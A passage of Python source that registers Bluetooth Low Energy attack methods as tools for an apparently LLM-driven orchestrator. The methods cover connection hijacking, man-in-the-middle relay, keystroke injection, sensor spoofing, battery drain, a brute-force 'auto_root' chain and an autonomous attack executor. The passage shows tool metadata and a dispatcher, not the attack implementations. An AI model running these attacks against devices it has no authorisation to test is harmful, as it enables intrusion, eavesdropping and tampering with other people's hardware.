            "args.out_path. Read-only serialization — no fabricated fields."),
        "input_schema": {"type": "object", "properties": {
            "session": {"type": "object"},
            "out_path": {"type": "string"}}},
        "examples": ["ble_attack(method='export_session', session={...}, "
                     "out_path='/tmp/ble_session.json')"],
        "risk_level": "read", "requires_root": False,
    },
    # ------------------------------------------------------------------
    # spec-named BLE attack modules (Phase 3 — implementacja.txt)
    # ------------------------------------------------------------------
    {
        "method": "ble_long_range_scan",
        "name": "ble_attack_ble_long_range_scan",
        "description": (
            "Enable LE Coded PHY (S=8) via btmgmt and run a passive "
            "scan. Real btmgmt subprocess; degrades when the tool is "
            "absent or the controller lacks LE Coded PHY support."),
        "input_schema": {"type": "object", "properties": {
            "adapter": {"type": "string"},
            "duration": {"type": "integer"}}, "required": []},
        "examples": ["ble_attack(method='ble_long_range_scan')"],
        "risk_level": "read", "requires_root": False,
    },
    {
        "method": "ble_adv_data_injection",
        "name": "ble_attack_ble_adv_data_injection",
        "description": (
            "Build a scapy BLE advertisement frame (BTLE_ADV + "
            "ADV_IND) for transmission. Real scapy; the link-layer "
            "send requires root + a writable controller and is "
            "NEVER auto-fired."),
        "input_schema": {"type": "object", "properties": {
            "adv_data": {"type": "string"},
            "address": {"type": "string"}}, "required": []},
        "examples": ["ble_attack(method='ble_adv_data_injection')"],
        "risk_level": "intrusive", "requires_root": True,
    },
    {
        "method": "ble_connection_hijacking",
        "name": "ble_attack_ble_connection_hijacking",
        "description": (
            "Replay a captured CONNECT_REQ PDU to hijack an "
            "existing BLE connection. Real scapy frame build; "
            "the operator must provide the captured PDU bytes."),
        "input_schema": {"type": "object", "properties": {
            "pdu_b64": {"type": "string"},
            "transmit": {"type": "boolean"}}, "required": ["pdu_b64"]},
        "examples": ["ble_attack(method='ble_connection_hijacking', "
                     "pdu_b64='<base64>')"],
        "risk_level": "intrusive", "requires_root": True,
    },
    {
        "method": "ble_man_in_the_middle_attack",
        "name": "ble_attack_ble_man_in_the_middle_attack",
        "description": (
            "Stand up a gatttool + btproxy MITM relay against "
            "args.address. Plan only — the relay is NEVER auto-started; "
            "it requires root + the per-step ACCEPT gate."),
        "input_schema": {"type": "object", "properties": {
            "adapter": {"type": "string"},
            "address": {"type": "string"}}, "required": ["address"]},
        "examples": ["ble_attack(method='ble_man_in_the_middle_attack', "
                     "address='AA:BB:CC:..')"],
        "risk_level": "intrusive", "requires_root": True,
    },
    {
        "method": "ble_audio_sniffing",
        "name": "ble_attack_ble_audio_sniffing",
        "description": (
            "Sniff LE Audio (LC3 over CIS) traffic via btmon. Real "
            "btmon subprocess bounded by timeout; degrades when btmon "
            "absent."),
        "input_schema": {"type": "object", "properties": {
            "timeout": {"type": "integer"},
            "out_path": {"type": "string"}}, "required": []},
        "examples": ["ble_attack(method='ble_audio_sniffing')"],
        "risk_level": "read", "requires_root": False,
    },
    {
        "method": "ble_temperature_spoofing",
        "name": "ble_attack_ble_temperature_spoofing",
        "description": (
            "Write a fake Health Thermometer value to the 0x2A1C "
            "characteristic via gatttool. Real write; verdict is "
            "the gatttool return code, never a fabricated spoof."),
        "input_schema": {"type": "object", "properties": {
            "adapter": {"type": "string"},
            "address": {"type": "string"},
            "uuid": {"type": "string"},
            "value": {"type": "string"}}, "required": ["address"]},
        "examples": ["ble_attack(method='ble_temperature_spoofing', "
                     "address='AA:BB:CC:..', value='00 00 00 00')"],
        "risk_level": "intrusive", "requires_root": False,
    },
    {
        "method": "ble_keyboard_injection",
        "name": "ble_attack_ble_keyboard_injection",
        "description": (
            "Inject HID over GATT keyboard reports (0x2A4D). Real "
            "gatttool writes; degrades when gatttool absent. Verdict "
            "is the gatttool return code, never fabricated."),
        "input_schema": {"type": "object", "properties": {
            "adapter": {"type": "string"},
            "address": {"type": "string"},
            "reports": {"type": "array", "items": {"type": "string"}}},
            "required": ["address"]},
        "examples": ["ble_attack(method='ble_keyboard_injection', "
                     "address='AA:BB:CC:..')"],
        "risk_level": "intrusive", "requires_root": False,
    },
    {
        "method": "ble_energy_drain",
        "name": "ble_attack_ble_energy_drain",
        "description": (
            "Plan a sustained L2CAP connection at 7.5ms interval "
            "to drain the target's battery. Plan only — the actual "
            "lecup requires root + a live conn handle."),
        "input_schema": {"type": "object", "properties": {
            "adapter": {"type": "string"},
            "address": {"type": "string"},
            "duration": {"type": "integer"}}, "required": ["address"]},
        "examples": ["ble_attack(method='ble_energy_drain', "
                     "address='AA:BB:CC:..')"],
        "risk_level": "intrusive", "requires_root": True,
    },
    {
        "method": "ble_multi_connection_pivot",
        "name": "ble_attack_ble_multi_connection_pivot",
        "description": (
            "Maintain N parallel L2CAP channels to a set of BLE "
            "targets via hcitool lecc. Real per-address subprocess; "
            "reports actual channel handles the controller granted."),
        "input_schema": {"type": "object", "properties": {
            "addresses": {"type": "array", "items": {"type": "string"}},
            "max": {"type": "integer"}}, "required": ["addresses"]},
        "examples": ["ble_attack(method='ble_multi_connection_pivot', "
                     "addresses=['AA:BB:CC:..'])"],
        "risk_level": "intrusive", "requires_root": False,
    },
    {
        "method": "ble_whitelist_bypass",
        "name": "ble_attack_ble_whitelist_bypass",
        "description": (
            "Probe a target's RPA filter by sampling hcitool lerand. "
            "Heuristic — records what the controller observed; NEVER "
            "fabricates an IRK recovery."),
        "input_schema": {"type": "object", "properties": {
            "adapter": {"type": "string"},
            "address": {"type": "string"},
            "samples": {"type": "integer"}}, "required": []},
        "examples": ["ble_attack(method='ble_whitelist_bypass')"],
        "risk_level": "read", "requires_root": False,
    },
    {
        "method": "ble_swarm_coordinator",
        "name": "ble_attack_ble_swarm_coordinator",
        "description": (
            "Drive a parallel attack against args.addresses from up "
            "to N hci adapters. Real per-adapter subprocess; reports "
            "per-adapter envelopes, never a fabricated swarm success."),
        "input_schema": {"type": "object", "properties": {
            "adapters": {"type": "array", "items": {"type": "string"}},
            "addresses": {"type": "array", "items": {"type": "string"}},
            "sub_method": {"type": "string"},
            "max": {"type": "integer"}}, "required": ["addresses"]},
        "examples": ["ble_attack(method='ble_swarm_coordinator', "
                     "addresses=['AA:BB:CC:..'])"],
        "risk_level": "intrusive", "requires_root": False,
    },
    {
        "method": "ble_auto_root",
        "name": "ble_attack_ble_auto_root",
        "description": (
            "Heuristic chain: pairing_pin_bruteforce -> "
            "gatt_write_exploit -> firmware_dump_via_gatt. Returns "
            "ok=True only if ALL stages succeeded; partial success is "
            "ok=False with per-stage errors visible."),
        "input_schema": {"type": "object", "properties": {
            "adapter": {"type": "string"},
            "address": {"type": "string"}}, "required": ["address"]},
        "examples": ["ble_attack(method='ble_auto_root', "
                     "address='AA:BB:CC:..')"],
        "risk_level": "intrusive", "requires_root": False,
    },
    {
        "method": "ble_auto_attack_executor",
        "name": "ble_attack_ble_auto_attack_executor",
        "description": (
            "LLM-coordinator that dispatches a caller-supplied plan "
            "(args.plan_steps). Returns ok=False with "
            "'requires plan' if no plan is given; never fabricates "
            "an attack sequence of its own."),
        "input_schema": {"type": "object", "properties": {
            "plan_steps": {"type": "array", "items": {"type": "object"}},
            "address": {"type": "string"}}, "required": ["plan_steps"]},
        "examples": ["ble_attack(method='ble_auto_attack_executor', "
                     "plan_steps=[{...}])"],
        "risk_level": "intrusive", "requires_root": False,
    },
]


def run_attack(method: str, adapter: Optional[str] = None,
               scanner: Optional[Any] = None,
               args: Optional[Dict[str, Any]] = None,
               **_: Any) -> Dict[str, Any]:
    """Module-level single-attack entrypoint: construct a one-shot
    :class:`BLEAttackRunner` and run the named attack. Used by the MCP
    wrappers and the orchestrator's ``ble_attack`` dispatch. ``args``
    carries per-attack inputs (address, uuid, payload, pin_list, session).
    Never raises."""
    try:
        runner = BLEAttackRunner(adapter=adapter, scanner=scanner, args=args)
        return runner.run_attack(method)
    except Exception as e:  # noqa: BLE001
        return {"name": method, "ok": False, "error": str(e),
                "data": None, "duration_s": 0.0}